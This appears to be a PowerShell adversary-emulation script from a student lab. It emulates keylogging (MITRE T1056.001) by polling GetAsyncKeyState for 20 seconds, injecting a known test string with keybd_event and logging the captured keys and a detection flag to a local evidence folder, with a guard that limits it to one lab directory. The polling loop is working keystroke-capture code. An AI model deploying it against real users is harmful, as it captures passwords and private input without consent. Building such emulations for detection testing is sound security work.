$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA073*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'; New-Item -ItemType Directory -Force -Path $ev | Out-Null
$seed = 'tfg-key-2026'
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
'@
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$log = Join-Path $ev 'key.log'
$end = (Get-Date).AddSeconds(20)
$keys = @(0x30..0x5A) + 0xBD
$prev = @{}
$seq = New-Object System.Collections.Generic.List[string]
# Inyeccion con keybd_event: mantiene cada tecla pulsada 150 ms para que el
# sondeo GetAsyncKeyState la observe con seguridad (SendKeys era demasiado rapido).
$job = Start-Job {
    Start-Sleep -Seconds 2
    Add-Type @'
using System;
using System.Runtime.InteropServices;
public class KB {
    [DllImport("user32.dll")]
    public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
}
'@
    $vkmap = @{ 't'=0x54; 'f'=0x46; 'g'=0x47; '-'=0xBD; 'k'=0x4B; 'e'=0x45; 'y'=0x59; '2'=0x32; '0'=0x30; '6'=0x36 }
    foreach ($ch in 'tfg-key-2026'.ToCharArray()) {
        $vk = [byte]$vkmap[[string]$ch]
        [KB]::keybd_event($vk, 0, 0, [UIntPtr]::Zero)
        Start-Sleep -Milliseconds 150
        [KB]::keybd_event($vk, 0, 2, [UIntPtr]::Zero)
        Start-Sleep -Milliseconds 150
    }
}
while ((Get-Date) -lt $end) {
    foreach ($vk in $keys) {
        $down = (([K]::GetAsyncKeyState($vk) -band 0x8000) -ne 0)
        if ($down -and -not $prev.ContainsKey($vk)) { $seq.Add($vk.ToString('X2')); $prev[$vk] = $true }
        if (-not $down -and $prev.ContainsKey($vk)) { $prev.Remove($vk) }
    }
    Start-Sleep -Milliseconds 15
}
Wait-Job $job | Out-Null; Remove-Job $job
$secuencia = $seq -join ','
$secuencia | Out-File -FilePath $log -Encoding ascii
$needle = '54,46,47,BD,4B,45,59,BD,32,30,32,36'
$cadena = $secuencia -match [regex]::Escape($needle)
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
@(
    "ata=ATA073", "tecnica=T1056.001", "fuente=ART_adaptado",
    "guid=d9b633ca-8efb-45e6-b838-70f595c6ae26",
    "t0=$t0", "t1=$t1", "seed=$seed", "secuencia=$secuencia",
    "cadena_detectada=$cadena"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
exit 0
